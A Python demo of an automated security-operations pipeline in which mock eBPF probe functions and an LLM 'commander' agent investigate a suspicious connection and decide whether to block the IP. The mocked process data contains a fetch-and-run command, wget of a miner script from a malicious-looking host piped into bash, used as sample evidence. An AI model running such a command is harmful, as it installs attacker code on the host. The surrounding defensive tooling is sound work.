import json
import time
import os
from dotenv import load_dotenv
from openai import OpenAI

# 加载 .env 环境变量
load_dotenv()

class MockCplusplusProbe:
    def get_pid_by_connection(self, ip, port):
        print(f"  [💻 C++ eBPF 探针] 扫描 /proc/net/tcp... 找到 IP {ip}:{port} 对应的 PID 为 8901")
        return '{"pid": 8901}'
        
    def analyze_process_behavior(self, pid):
        print(f"  [💻 C++ eBPF 探针] 读取 /proc/{pid}/cmdline...")
        return '{"cmdline": "wget http://malware.cn/miner.sh -O -> bash", "cwd": "/tmp"}'
        
    def block_malicious_ip(self, ip):
        print(f"  [💻 C++ eBPF 探针] 调用 bpf_map_update_elem 注入 IP {ip} 到网卡 XDP 硬件芯片...")
        return '{"status": "success", "action": "eBPF 硬件拦截生效"}'

c_probe = MockCplusplusProbe()

client = OpenAI(
    api_key=os.environ.get("OPENAI_API_KEY"),
    base_url=os.environ.get("OPENAI_BASE_URL")
)
MODEL_NAME = os.environ.get("MODEL_NAME", "deepseek-chat")

def investigator_agent(threat_ip, threat_port):
    print(f"\n[🕵️ 取证专家 (Agent 1)] 接到告警，开始调查 IP {threat_ip}:{threat_port}...")
    time.sleep(1)
    pid_result = json.loads(c_probe.get_pid_by_connection(threat_ip, threat_port))
    pid = pid_result.get("pid")
    
    time.sleep(1)
    proc_info = json.loads(c_probe.analyze_process_behavior(pid))
    cmdline = proc_info.get("cmdline")
    
    report = f"发现嫌疑进程 PID {pid}，其运行的命令行参数为: [{cmdline}]。"
    print(f"[🕵️ 取证专家] {report}")
    return report

def commander_agent(threat_ip, investigation_report):
    print(f"\n[👑 安全总指挥 (Agent 2)] 正在阅读取证报告，结合 RAG 知识库进行大模型研判...")
    
    messages = [
        {
            "role": "system", 
            "content": "你是一个 SOC 决策总指挥。你的本地知识库(RAG)中记录了：【wget 命令如果结合 bash 执行未知脚本，99% 是挖矿木马或 APT 后门】。请根据调查员的报告做出决策。如果确认为高危攻击，请必须在回答的最末尾加上精确的指令：<BLOCK_IP>，并在前面输出你的安全溯源分析。"
        },
        {
            "role": "user", 
            "content": f"目标 IP: {threat_ip}。调查报告如下：{investigation_report}。请定性并给出最终处置决议。"
        }
    ]
    
    try:
        response = client.chat.completions.create(
            model=MODEL_NAME,
            messages=messages
        )
        decision = response.choices[0].message.content
        print(f"\n[👑 安全总指挥] \n{decision}")
        
        if "<BLOCK_IP>" in decision:
            print(f"\n[🛡️ eBPF 防火墙] 收到总指挥官授权，对 {threat_ip} 执行内核级物理斩杀！")
            time.sleep(1)
            c_probe.block_malicious_ip(threat_ip)
            print("[🛡️ eBPF 防火墙] 威胁已从网卡层彻底清除，CPU 损耗 0%。")
    except Exception as e:
        print(f"[👑 安全总指挥] API 请求失败，无法下达指令：{e}")

if __name__ == "__main__":
    print("======================================================")
    print(" 🚀 Aegis v2.0 - 基于 eBPF 与 Multi-Agent RAG 的全自动化 SOC")
    print("======================================================")
    
    time.sleep(1)
    print("\n[🚨 数据面预警] ET-BERT ONNX 模型在 TLS 加密流量中发现异常特征！(评分 0.99) 源 IP: 45.33.22.11, 端口: 443")
    
    time.sleep(1)
    report = investigator_agent("45.33.22.11", 443)
    
    time.sleep(1)
    commander_agent("45.33.22.11", report)
    
    print("\n[✅ 结案] Aegis 系统自动闭环响应完成，耗时 < 5 秒。")